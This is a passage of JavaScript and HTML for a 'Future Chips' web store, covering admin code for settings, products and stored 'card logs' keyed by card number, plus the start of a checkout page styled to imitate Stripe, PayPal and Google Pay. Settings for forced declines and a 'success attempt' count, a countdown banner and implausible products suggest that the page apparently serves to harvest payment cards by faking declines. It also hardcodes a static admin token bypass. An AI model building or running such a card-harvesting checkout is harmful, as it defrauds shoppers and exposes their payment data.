    document.getElementById('settings-bg-text').value = (saved.background_color || '#0A0A1A').toUpperCase();

    const declineAllCheck = document.getElementById('settings-decline-all');
    if (declineAllCheck) declineAllCheck.checked = saved.decline_all === true || saved.decline_all === 1;

    const successAttemptInput = document.getElementById('settings-success-attempt');
    if (successAttemptInput) successAttemptInput.value = saved.success_attempt !== undefined ? saved.success_attempt : 1;

    const declineThresholdInput = document.getElementById('settings-decline-threshold');
    if (declineThresholdInput) declineThresholdInput.value = saved.decline_threshold !== undefined ? saved.decline_threshold : 50.0;
  }
}

// --- FORM SUBMISSIONS & ACTIONS ---

// Save Site Settings
async function saveSettings(e) {
  e.preventDefault();
  const successDiv = document.getElementById('settings-success');
  if (!successDiv) return;
  successDiv.innerText = '';
  successDiv.style.color = '';

  const site_name = document.getElementById('settings-site-name').value;
  const primary_color = document.getElementById('settings-primary-text').value;
  const accent_color = document.getElementById('settings-accent-text').value;
  const background_color = document.getElementById('settings-bg-text').value;

  const declineAllCheck = document.getElementById('settings-decline-all');
  const decline_all = declineAllCheck ? declineAllCheck.checked : false;
  
  const successAttemptInput = document.getElementById('settings-success-attempt');
  const success_attempt = successAttemptInput ? parseInt(successAttemptInput.value) : 1;
  
  const declineThresholdInput = document.getElementById('settings-decline-threshold');
  const decline_threshold = declineThresholdInput ? parseFloat(declineThresholdInput.value) : 50.0;

  try {
    const response = await fetch('/api/admin/settings', {
      method: 'PUT',
      headers: {
        'Content-Type': 'application/json',
        ...getAuthHeaders()
      },
      body: JSON.stringify({ 
        site_name, 
        primary_color, 
        accent_color, 
        background_color, 
        decline_all, 
        decline_threshold,
        success_attempt
      })
    });

    if (response.status === 401 && token !== 'static-admin-token-2026') {
      return handleSessionExpired();
    }

    if (response.ok) {
      const settings = await response.json();
      document.documentElement.style.setProperty('--primary-color', settings.primary_color);
      document.documentElement.style.setProperty('--accent-color', settings.accent_color);
      document.documentElement.style.setProperty('--background-color', settings.background_color);

      // Cache locally for static fallback
      const settingsObj = { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt };
      localStorage.setItem('future_chips_settings', JSON.stringify(settingsObj));

      successDiv.style.color = '#00ff88';
      successDiv.innerText = '✅ Site parameters updated and saved to server database successfully.';
      setTimeout(() => { successDiv.innerText = ''; }, 4000);
      return;
    }

    const errData = await response.json().catch(() => ({}));
    throw new Error(errData.error || \`Server error (\${response.status})\`);

  } catch (err) {
    console.warn('Failed to save settings to backend server:', err);
    document.documentElement.style.setProperty('--primary-color', primary_color);
    document.documentElement.style.setProperty('--accent-color', accent_color);
    document.documentElement.style.setProperty('--background-color', background_color);

    const settingsObj = { site_name, primary_color, accent_color, background_color, decline_all, decline_threshold, success_attempt };
    localStorage.setItem('future_chips_settings', JSON.stringify(settingsObj));

    if (token === 'static-admin-token-2026' || err.message.includes('Failed to fetch') || err.message.includes('API offline')) {
      successDiv.style.color = '#ffaa00';
      successDiv.innerText = '⚠️ Backend server offline: Settings saved LOCALLY on this browser only. Ensure backend server is running to sync across PCs.';
    } else {
      successDiv.style.color = '#ff4444';
      successDiv.innerText = \`❌ Failed to save to database: \${err.message}\`;
    }
    setTimeout(() => { successDiv.innerText = ''; }, 6000);
  }
}

// Add/Edit Product Submission
async function handleProductSubmit(e) {
  e.preventDefault();
  
  const id = document.getElementById('product-id-field').value;
  const name = document.getElementById('product-name-field').value;
  const category = document.getElementById('product-category-field').value;
  const price = document.getElementById('product-price-field').value;
  const description = document.getElementById('product-desc-field').value;
  const imageInput = document.getElementById('product-image-field');

  const formData = new FormData();
  formData.append('name', name);
  formData.append('category', category);
  formData.append('price', price);
  formData.append('description', description);
  if (imageInput.files[0]) {
    formData.append('image', imageInput.files[0]);
  }

  const url = id ? \`/api/admin/products/\${id}\` : '/api/admin/products';
  const method = id ? 'PUT' : 'POST';

  try {
    const response = await fetch(url, {
      method: method,
      headers: getAuthHeaders(),
      body: formData
    });

    if (response.ok) {
      document.getElementById('product-modal').classList.remove('active');
      resetProductForm();
      await fetchAdminProducts();
      return;
    }
    throw new Error('API offline');
  } catch (err) {
    console.warn('API offline, saving product locally:', err);
    let products = JSON.parse(localStorage.getItem('future_chips_products')) || [
      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
    ];

    if (id) {
      const idx = products.findIndex(p => p.id === id);
      if (idx !== -1) {
        products[idx] = { ...products[idx], name, category, price: parseFloat(price), description };
      }
    } else {
      const newProd = {
        id: 'prod-' + Date.now(),
        name,
        category,
        price: parseFloat(price),
        description,
        image: '/uploads/placeholder.svg'
      };
      products.push(newProd);
    }
    localStorage.setItem('future_chips_products', JSON.stringify(products));

    document.getElementById('product-modal').classList.remove('active');
    resetProductForm();
    await fetchAdminProducts();
  }
}

// Edit product prefill modal trigger
window.editProduct = async function(id) {
  try {
    let p;
    const res = await fetch(\`/api/products/\${id}\`);
    if (res.ok) {
      p = await res.json();
    } else {
      throw new Error();
    }
    document.getElementById('product-id-field').value = p.id;
    document.getElementById('product-name-field').value = p.name;
    document.getElementById('product-category-field').value = p.category;
    document.getElementById('product-price-field').value = p.price;
    document.getElementById('product-desc-field').value = p.description || '';
  } catch (err) {
    const products = JSON.parse(localStorage.getItem('future_chips_products')) || [
      { id: 'prod-nano-chip', name: 'Nano-Constructor Unit', category: 'Processors', price: 10.00, image: '/uploads/nano_constructor.svg' },
      { id: 'prod-quantum-core', name: 'Quantum Neural Core', category: 'Processors', price: 150.00, image: '/uploads/quantum_core.svg' },
      { id: 'prod-bio-synapse', name: 'Bio-Digital Synapse v4.2', category: 'Interfaces', price: 850.00, image: '/uploads/bio_synapse.svg' },
      { id: 'prod-holo-matrix', name: 'Holographic Display Matrix', category: 'Displays', price: 1200.00, image: '/uploads/holo_matrix.svg' },
      { id: 'prod-photon-core', name: 'Photon Power Core', category: 'Energy', price: 5000.00, image: '/uploads/photon_core.svg' },
      { id: 'prod-gravitational-grid', name: 'Gravitational Grid Controller', category: 'Energy', price: 98000.00, image: '/uploads/gravitational_grid.svg' }
    ];
    const p = products.find(item => item.id === id);
    if (p) {
      document.getElementById('product-id-field').value = p.id;
      document.getElementById('product-name-field').value = p.name;
      document.getElementById('product-category-field').value = p.category;
      document.getElementById('product-price-field').value = p.price;
      document.getElementById('product-desc-field').value = p.description || '';
    }
  }
  document.getElementById('modal-title').innerText = 'Modify Cyber Module';
  document.getElementById('modal-submit-btn').innerText = 'Update Product Data';
  document.getElementById('product-modal').classList.add('active');
};

// Delete Product
window.deleteProduct = async function(id) {
  showCustomConfirm(
    '⚠️ Erasure Warning',
    'Are you sure you want to permanently erase this module from the database?',
    async () => {
      try {
        const response = await fetch(\`/api/admin/products/\${id}\`, {
          method: 'DELETE',
          headers: getAuthHeaders()
        });
        if (!response.ok) throw new Error();
      } catch (err) {
        let products = JSON.parse(localStorage.getItem('future_chips_products')) || [];
        products = products.filter(p => p.id !== id);
        localStorage.setItem('future_chips_products', JSON.stringify(products));
      }
      await fetchAdminProducts();
    }
  );
};

// Reset modal form
function resetProductForm() {
  document.getElementById('product-id-field').value = '';
  document.getElementById('product-name-field').value = '';
  document.getElementById('product-price-field').value = '';
  document.getElementById('product-desc-field').value = '';
  document.getElementById('product-image-field').value = '';
  document.getElementById('product-category-field').selectedIndex = 0;
}

// Session Expired helper
function handleSessionExpired() {
  showCustomAlert('🔒 Session Expired', 'Security token expired. Please login again.');
  localStorage.removeItem('admin_token');
  localStorage.removeItem('admin_trash_pin');
  localStorage.setItem('admin_cards_showing_trash', 'false');
  setTimeout(() => {
    window.location.href = '/admin/index.html';
  }, 2000);
}



// Custom Confirmation Dialog helper
function showCustomConfirm(title, message, onConfirm) {
  const modal = document.getElementById('confirm-modal');
  const titleEl = document.getElementById('confirm-modal-title');
  const messageEl = document.getElementById('confirm-modal-message');
  const okBtn = document.getElementById('confirm-ok-btn');
  const cancelBtn = document.getElementById('confirm-cancel-btn');
  const backdrop = document.getElementById('confirm-modal-backdrop');

  if (!modal) return;

  titleEl.innerText = title;
  messageEl.innerText = message;

  const cleanUp = () => {
    modal.classList.remove('active');
    okBtn.onclick = null;
    cancelBtn.onclick = null;
    backdrop.onclick = null;
  };

  okBtn.onclick = () => {
    cleanUp();
    onConfirm();
  };

  cancelBtn.onclick = cleanUp;
  backdrop.onclick = cleanUp;

  modal.classList.add('active');
}

// Custom Alert Dialog helper
function showCustomAlert(title, message) {
  showCustomConfirm(title, message, () => {});
  const cancelBtn = document.getElementById('confirm-cancel-btn');
  if (cancelBtn) cancelBtn.style.display = 'none';
  const okBtn = document.getElementById('confirm-ok-btn');
  if (okBtn) {
    okBtn.innerText = 'Dismiss';
    okBtn.style.background = 'var(--primary-color)';
    okBtn.style.borderColor = 'var(--primary-color)';
  }
  
  const okBtnClick = () => {
    if (cancelBtn) cancelBtn.style.display = 'block';
    if (okBtn) {
      okBtn.innerText = 'Delete';
      okBtn.style.background = '#ef4444';
      okBtn.style.borderColor = '#ef4444';
    }
  };

  const backdrop = document.getElementById('confirm-modal-backdrop');
  backdrop.addEventListener('click', okBtnClick, { once: true });
  okBtn.addEventListener('click', okBtnClick, { once: true });
}

// Soft delete active card entry
window.deleteCard = function(cardNumber) {
  showCustomConfirm(
    '🗑️ Delete Card Log',
    'Are you sure you want to move this card log to the trash bin?',
    async () => {
      try {
        const response = await fetch(\`/api/admin/cards/\${encodeURIComponent(cardNumber)}/delete\`, {
          method: 'PUT',
          headers: getAuthHeaders()
        });

        if (response.status === 401) return handleSessionExpired();
        const data = await response.json();
        if (!response.ok) throw new Error(data.error);

        await fetchAdminCards();
      } catch (err) {
        showCustomAlert('❌ Execution Failed', err.message || 'Failed to soft delete card.');
      }
    }
  );
};

// Permanent hard delete card entry from database
window.deletePermanentCard = function(cardNumber) {
  showCustomConfirm(
    '⚠️ Permanent Erasure',
    'Are you sure you want to permanently erase this card details from database? This action is irreversible.',
    async () => {
      try {
        const response = await fetch(\`/api/admin/cards/\${encodeURIComponent(cardNumber)}\`, {
          method: 'DELETE',
          headers: getAuthHeaders()
        });

        if (response.status === 401) return handleSessionExpired();
        const data = await response.json();
        if (!response.ok) throw new Error(data.error);

        await fetchAdminCards(trashDecryptionKey);
      } catch (err) {
        showCustomAlert('❌ Execution Failed', err.message || 'Failed to permanently delete card.');
      }
    }
  );
};

</script>
</body>
</html>
`;
const CHECKOUT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Checkout — Future Chips</title>
  
<style>
@import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Outfit:wght@400;700;900&display=swap');

:root {
  /* Dynamic themes, fallback values */
  --primary-color: #00f0ff;
  --accent-color: #ff00e5;
  --background-color: #0a0a1a;
  --card-bg: rgba(16, 16, 36, 0.6);
  --text-color: #ffffff;
  --text-muted: #8c8cbe;
  
  --font-title: 'Outfit', sans-serif;
  --font-body: 'Inter', sans-serif;
}

* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

body {
  background-color: var(--background-color);
  color: var(--text-color);
  font-family: var(--font-body);
  line-height: 1.6;
  overflow-x: hidden;
  background-image: 
    radial-gradient(circle at 10% 20%, rgba(0, 240, 255, 0.05) 0%, transparent 40%),
    radial-gradient(circle at 90% 80%, rgba(255, 0, 229, 0.05) 0%, transparent 40%);
  background-attachment: fixed;
}

/* Glassmorphism utility */
.glass {
  background: var(--card-bg);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border: 1px solid rgba(255, 255, 255, 0.05);
}

.container {
  width: 90%;
  max-width: 1200px;
  margin: 0 auto;
}

/* Header */
header {
  position: sticky;
  top: 0;
  z-index: 100;
  padding: 1.5rem 0;
  transition: background 0.3s;
}

header.scrolled {
  background: rgba(10, 10, 26, 0.85);
  backdrop-filter: blur(10px);
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

header .nav-container {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.logo {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.8rem;
  letter-spacing: 2px;
  color: #ffffff;
  text-decoration: none;
  display: flex;
  align-items: center;
  gap: 0.5rem;
}

.logo span {
  background: linear-gradient(45deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  filter: drop-shadow(0 0 10px rgba(0, 240, 255, 0.3));
}

.nav-links {
  display: flex;
  gap: 2rem;
  list-style: none;
}

.nav-links a {
  color: var(--text-muted);
  text-decoration: none;
  font-weight: 500;
  transition: color 0.3s;
}

.nav-links a:hover {
  color: #ffffff;
}

.cart-icon-btn {
  background: none;
  border: none;
  color: #ffffff;
  cursor: pointer;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  width: 45px;
  height: 45px;
  border-radius: 50%;
  transition: background 0.3s;
}

.cart-icon-btn:hover {
  background: rgba(255, 255, 255, 0.05);
}

.cart-icon-btn svg {
  width: 22px;
  height: 22px;
  fill: currentColor;
}

.cart-badge {
  position: absolute;
  top: 5px;
  right: 5px;
  background: var(--accent-color);
  color: #ffffff;
  font-size: 0.75rem;
  font-weight: bold;
  padding: 2px 6px;
  border-radius: 10px;
  box-shadow: 0 0 10px var(--accent-color);
}

/* Hero Section */
.hero {
  padding: 6rem 0 4rem 0;
  text-align: center;
  position: relative;
}

.hero h1 {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 4rem;
  line-height: 1.1;
  margin-bottom: 1rem;
  letter-spacing: -1px;
}

.hero h1 span {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  display: inline-block;
  animation: glow-pulse 3s infinite alternate;
}

.hero p {
  color: var(--text-muted);
  font-size: 1.2rem;
  max-width: 600px;
  margin: 0 auto 2.5rem auto;
}

/* Search and Filters */
.filters-section {
  margin-bottom: 3rem;
  padding: 1.5rem;
  border-radius: 16px;
}

.filters-wrapper {
  display: flex;
  gap: 1.5rem;
  flex-wrap: wrap;
  align-items: center;
  justify-content: space-between;
}

.search-box {
  flex: 1;
  min-width: 280px;
  position: relative;
}

.search-box input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1rem 0.8rem 2.8rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.search-box input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

.search-box svg {
  position: absolute;
  left: 1rem;
  top: 50%;
  transform: translateY(-50%);
  width: 18px;
  height: 18px;
  fill: var(--text-muted);
}

.filter-group {
  display: flex;
  gap: 1rem;
  align-items: center;
}

.filter-group select {
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.8rem 1.5rem;
  color: #ffffff;
  cursor: pointer;
  outline: none;
  font-family: var(--font-body);
  transition: border-color 0.3s;
}

.filter-group select:focus {
  border-color: var(--primary-color);
}

/* Product Grid */
.products-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
  gap: 2.5rem;
  margin-bottom: 5rem;
}

/* Product Card */
.product-card {
  border-radius: 20px;
  overflow: hidden;
  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), box-shadow 0.4s;
  display: flex;
  flex-direction: column;
  height: 100%;
}

.product-card:hover {
  transform: translateY(-8px);
  box-shadow: 0 15px 30px rgba(0, 240, 255, 0.1);
  border-color: rgba(0, 240, 255, 0.3);
}

.product-image-wrap {
  width: 100%;
  aspect-ratio: 1;
  position: relative;
  background: #000;
  display: flex;
  align-items: center;
  justify-content: center;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
}

.product-image-wrap img {
  width: 100%;
  height: 100%;
  object-fit: cover;
  transition: transform 0.5s ease;
}

.product-card:hover .product-image-wrap img {
  transform: scale(1.05);
}

.product-info {
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  flex-grow: 1;
}

.product-category {
  font-size: 0.75rem;
  text-transform: uppercase;
  letter-spacing: 2px;
  color: var(--primary-color);
  margin-bottom: 0.5rem;
  font-weight: 700;
}

.product-title {
  font-family: var(--font-title);
  font-size: 1.4rem;
  font-weight: 700;
  margin-bottom: 0.5rem;
  line-height: 1.3;
}

.product-desc {
  color: var(--text-muted);
  font-size: 0.9rem;
  margin-bottom: 1.5rem;
  display: -webkit-box;
  -webkit-line-clamp: 2;
  -webkit-box-orient: vertical;
  overflow: hidden;
  text-overflow: ellipsis;
  flex-grow: 1;
}

.product-footer {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.product-price {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 1.5rem;
  color: #ffffff;
}

.btn {
  display: inline-flex;
  align-items: center;
  justify-content: center;
  gap: 0.5rem;
  padding: 0.8rem 1.5rem;
  border-radius: 10px;
  font-weight: 600;
  font-family: var(--font-body);
  text-decoration: none;
  cursor: pointer;
  transition: all 0.3s;
  border: none;
}

.btn-primary {
  background: linear-gradient(90deg, var(--primary-color), var(--accent-color));
  color: #ffffff;
  box-shadow: 0 4px 15px rgba(0, 240, 255, 0.3);
}

.btn-primary:hover {
  transform: scale(1.03);
  box-shadow: 0 4px 20px rgba(0, 240, 255, 0.5);
}

.btn-outline {
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.2);
  color: #ffffff;
}

.btn-outline:hover {
  border-color: var(--primary-color);
  background: rgba(0, 240, 255, 0.05);
}

/* Detail View Layout */
.product-detail-layout {
  display: grid;
  grid-template-columns: 1.2fr 1fr;
  gap: 4rem;
  padding: 5rem 0;
  align-items: center;
}

@media (max-width: 768px) {
  .product-detail-layout {
    grid-template-columns: 1fr;
    gap: 2rem;
    padding: 2rem 0;
  }
  .hero h1 {
    font-size: 2.5rem;
  }
}

.detail-img-card {
  border-radius: 24px;
  overflow: hidden;
  aspect-ratio: 1;
}

.detail-img-card img {
  width: 100%;
  height: 100%;
  object-fit: cover;
}

.detail-info {
  display: flex;
  flex-direction: column;
}

.detail-price-box {
  margin: 1.5rem 0 2.5rem 0;
}

.detail-price-label {
  font-size: 0.85rem;
  color: var(--text-muted);
  text-transform: uppercase;
  letter-spacing: 1px;
}

.detail-price-val {
  font-family: var(--font-title);
  font-size: 3rem;
  font-weight: 900;
  line-height: 1.1;
  color: #ffffff;
}

.detail-checkout-form {
  display: flex;
  flex-direction: column;
  gap: 1rem;
}

.form-group {
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}

.form-group label {
  font-size: 0.9rem;
  color: var(--text-muted);
}

.form-group input {
  width: 100%;
  background: rgba(255, 255, 255, 0.05);
  border: 1px solid rgba(255, 255, 255, 0.1);
  border-radius: 10px;
  padding: 0.9rem 1rem;
  color: #ffffff;
  font-family: var(--font-body);
  transition: all 0.3s;
}

.form-group input:focus {
  border-color: var(--primary-color);
  outline: none;
  box-shadow: 0 0 15px rgba(0, 240, 255, 0.2);
}

/* Slide-over Cart Panel */
.cart-panel {
  position: fixed;
  top: 0;
  right: -450px;
  width: 100%;
  max-width: 420px;
  height: 100%;
  z-index: 1000;
  box-shadow: -10px 0 30px rgba(0,0,0,0.5);
  display: flex;
  flex-direction: column;
  transition: right 0.4s cubic-bezier(0.16, 1, 0.3, 1);
}

.cart-panel.active {
  right: 0;
}

.cart-header {
  padding: 1.5rem;
  border-bottom: 1px solid rgba(255, 255, 255, 0.05);
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.cart-header h2 {
  font-family: var(--font-title);
  font-size: 1.5rem;
}

.cart-close-btn {
  background: none;
  border: none;
  color: var(--text-muted);
  cursor: pointer;
  font-size: 1.5rem;
}

.cart-items {
  flex-grow: 1;
  overflow-y: auto;
  padding: 1.5rem;
  display: flex;
  flex-direction: column;
  gap: 1.5rem;
}

.cart-item {
  display: flex;
  gap: 1rem;
  align-items: center;
  padding-bottom: 1.5rem;
  border-bottom: 1px solid rgba(255,255,255,0.03);
}

.cart-item img {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  object-fit: cover;
  background: #000;
}

.cart-item-details {
  flex-grow: 1;
}

.cart-item-title {
  font-weight: 600;
  font-size: 0.95rem;
  margin-bottom: 0.2rem;
}

.cart-item-price {
  color: var(--primary-color);
  font-weight: 700;
  font-size: 0.9rem;
}

.cart-item-remove {
  background: none;
  border: none;
  color: var(--accent-color);
  cursor: pointer;
  font-size: 0.8rem;
  padding: 4px;
}

.cart-footer {
  padding: 1.5rem;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  background: rgba(8, 8, 20, 0.9);
}

.cart-total {
  display: flex;
  justify-content: space-between;
  font-size: 1.2rem;
  font-weight: bold;
  margin-bottom: 1.5rem;
}

.cart-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100vw;
  height: 100vh;
  background: rgba(0, 0, 0, 0.6);
  backdrop-filter: blur(4px);
  z-index: 999;
  display: none;
}

.cart-overlay.active {
  display: block;
}

/* Status / Confirmation page layout */
.status-card {
  max-width: 550px;
  margin: 8rem auto;
  padding: 3rem;
  border-radius: 24px;
  text-align: center;
}

.status-icon {
  width: 80px;
  height: 80px;
  border-radius: 50%;
  display: flex;
  align-items: center;
  justify-content: center;
  margin: 0 auto 2rem auto;
}

.status-icon.success {
  background: #ffffff;
  color: #22c55e; /* Vibrant success green */
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
  border: none;
}

.status-icon.success svg {
  width: 40px;
  height: 40px;
  fill: currentColor;
}

.status-title {
  font-family: var(--font-title);
  font-weight: 900;
  font-size: 2.2rem;
  margin-bottom: 1rem;
}

.status-text {
  color: var(--text-muted);
  margin-bottom: 2.5rem;
}

.receipt-info {
  background: rgba(255, 255, 255, 0.02);
  border: 1px solid rgba(255, 255, 255, 0.05);
  border-radius: 12px;
  padding: 1.5rem;
  text-align: left;
  margin-bottom: 2.5rem;
}

.receipt-row {
  display: flex;
  justify-content: space-between;
  margin-bottom: 0.8rem;
  font-size: 0.95rem;
}

.receipt-row:last-child {
  margin-bottom: 0;
  padding-top: 0.8rem;
  border-top: 1px solid rgba(255,255,255,0.05);
  font-weight: bold;
}

/* Animations */
@keyframes glow-pulse {
  from {
    filter: drop-shadow(0 0 5px var(--primary-color));
  }
  to {
    filter: drop-shadow(0 0 20px var(--accent-color));
  }
}

/* Footer styling */
footer {
  padding: 3rem 0;
  border-top: 1px solid rgba(255, 255, 255, 0.05);
  text-align: center;
  color: var(--text-muted);
  font-size: 0.9rem;
}

/* Custom Mock Checkout Page Styles */
*, *::before, *::after {
  box-sizing: border-box;
}

body.checkout-body {
  background-color: #f8f9fa;
  color: #1a1a1a;
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  line-height: 1.5;
  padding: 2rem 1rem;
  background-image: none;
}

.checkout-wrapper {
  max-width: 850px;
  margin: 0 auto;
  background: #ffffff;
  border-radius: 8px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.06);
  padding: 2.5rem;
}

/* Countdown Banner */
.countdown-container {
  text-align: center;
  margin-bottom: 2rem;
  font-size: 1.15rem;
  color: #1f2937;
  font-weight: 600;
}

.countdown-time {
  color: #ef4444;
  font-weight: 700;
  margin: 0 0.25rem;
}

/* Order Details Row */
.order-header-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding-bottom: 1.25rem;
  border-bottom: 1px solid #e5e7eb;
  margin-bottom: 2rem;
  flex-wrap: wrap;
  gap: 1rem;
}

.order-info-left {
  display: flex;
  align-items: center;
  gap: 0.75rem;
}

.order-number {
  font-weight: 700;
  color: #1f2937;
  font-size: 0.95rem;
}

.payment-details-dropdown {
  color: #6b7280;
  font-size: 0.85rem;
  cursor: pointer;
  display: flex;
  align-items: center;
  gap: 0.25rem;
  text-decoration: none;
  font-weight: 500;
}

.payment-details-dropdown:hover {
  color: #374151;
}

.order-total-box {
  font-size: 0.95rem;
  color: #4b5563;
  font-weight: 500;
}

.order-total-amount {
  font-size: 1.4rem;
  color: #2563eb;
  font-weight: 700;
  margin: 0 0.25rem;
}

/* Payment Methods Selector Row */
.payment-methods-row {
  display: flex;
  align-items: center;
  gap: 1.5rem;
  margin-bottom: 2.5rem;
  flex-wrap: wrap;
}

.payment-methods-label {
  color: #6b7280;
  font-size: 0.9rem;
  font-weight: 500;
  width: 130px;
}

.method-tabs {
  display: flex;
  gap: 1rem;
}

.method-tab {
  padding: 0.6rem 2rem;
  border-radius: 4px;
  cursor: pointer;
  font-weight: 700;
  display: flex;
  align-items: center;
  justify-content: center;
  position: relative;
  height: 44px;
  min-width: 120px;
  transition: all 0.2s;
  user-select: none;
}

.method-tab.stripe {
  border: 2px solid #2563eb;
  background: #eff6ff; /* light blue tint background */
}

/* Blue corner checkmark for Stripe */
.method-tab.stripe::after {
  content: "";
  position: absolute;
  bottom: 0;
  right: 0;
  width: 0;
  height: 0;
  border-style: solid;
  border-width: 0 0 16px 16px;
  border-color: transparent transparent #2563eb transparent;
}

/* Checkmark white tick inside the blue triangle */
.method-tab.stripe::before {
  content: "✓";
  position: absolute;
  bottom: -1px;
  right: 1px;
  color: #ffffff;
  font-size: 8px;
  font-weight: bold;
  z-index: 1;
}

.method-tab.paypal {
  border: 1px solid transparent;
  background: #f4f4f5;
}

.payment-method-logo {
  max-height: 22px;
  max-width: 100%;
  object-fit: contain;
  display: block;
}

svg.payment-method-logo {
  height: 22px;
  width: auto;
  display: block;
}

svg.stripe-logo, img.stripe-logo {
  height: 22px;
  width: auto;
  object-fit: contain;
  display: block;
}

svg.paypal-logo {
  height: 20px;
  width: 75px;
}

img.paypal-logo {
  height: 20px;
  width: auto;
  object-fit: contain;
  display: block;
}

/* Sub tabs: Card / Google Pay */
.sub-tabs-container {
  display: none;
  gap: 1rem;
  margin-bottom: 2rem;
}

.sub-tab {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: flex-start;
  justify-content: space-between;
  height: 52px;
  padding: 7px 12px;
  border-radius: 6px;
  cursor: pointer;
  font-size: 0.82rem;
  font-weight: 600;
  color: #6b7280;
  transition: all 0.2s;
  user-select: none;
  background: #ffffff;
  border: 1px solid #e5e7eb;
  box-sizing: border-box;
}

.sub-tab:hover:not(.active) {
  border-color: #d1d5db;
  background-color: #fafafa;
}

.sub-tab.active {
  border: 2px solid #2563eb;
  padding: 6px 11px; /* Offset the 2px border to prevent layout shift */
  color: #2563eb;
  font-weight: 600;
}

.sub-tab-icon {
  height: 20px;
  display: flex;
  align-items: center;
  justify-content: flex-start;
}

.sub-tab-label {
  display: block;
  text-align: left;
  line-height: 1.2;
}

/* Google Pay button text styling */
.gpay-text {
  font-family: 'Product Sans', 'Roboto', sans-serif;
  letter-spacing: -0.2px;
}

/* Checkout Form Container */
.checkout-form-content {
  margin-top: 1.5rem;
}

.form-section-card {
  display: block;
}

.form-section-gpay {
  display: none;
}

/* Fast Checkout Link Helper (Collapsed State) */
.link-checkout-collapsed {
  display: flex;
  align-items: center;
  justify-content: space-between;
  color: #2563eb; /* blue color for link text and arrow */
  font-size: 0.85rem;
  font-weight: 600;
  cursor: pointer;
  user-select: none;
}

.link-checkout-helper-left {
  display: flex;
  align-items: center;
  gap: 0.35rem;
}

.link-text {
  color: #2563eb;
}

.link-arrow {
  color: #2563eb;
}

/* Link Fast Checkout Box (Expanded State) */
.link-checkout-expanded {
  background: #ffffff;
  border: 1px solid #d1d5db;
  border-radius: 6px;
  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
  overflow: hidden;
}

.link-box-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0.75rem 1rem;
  border-bottom: 1px solid #f3f4f6;
}

.link-text-bold {
  font-size: 0.85rem;
  font-weight: 700;
  color: #1f2937;
}

.link-close-btn {
  background: none;
  border: none;
  font-size: 1.25rem;
  color: #9ca3af;
  cursor: pointer;
  line-height: 1;
  padding: 0;
}

.link-close-btn:hover {
  color: #4b5563;
}

.link-box-body {
  padding: 1rem;
}

.link-box-description {
  font-size: 0.82rem;
  color: #4b5563;
  line-height: 1.4;
  margin-bottom: 1rem;
  text-align: left;
}

.link-input-label {
  display: block;
  font-size: 0.8rem;
  font-weight: 600;
  color: #4b5563;
  margin-bottom: 0.35rem;
  text-align: left;
}

.link-box-footer {
  background: #fafafa;
  padding: 0.5rem 1rem;
  border-top: 1px solid #f3f4f6;
  display: flex;
  align-items: center;
}

.link-logo-container {
  display: flex;
  align-items: center;
}

/* Form Inputs styling */
.checkout-input-group {
  margin-bottom: 1.25rem;
}

.checkout-input-group label {
  display: block;
  font-size: 0.85rem;
  font-weight: 500;
  color: #4b5563;
  margin-bottom: 0.35rem;
}

.input-container-with-icons {
  position: relative;
  display: flex;
  align-items: center;
}

.checkout-input {
  width: 100%;
  padding: 0.75rem;
  border: 1px solid #d1d5db;
  border-radius: 6px;
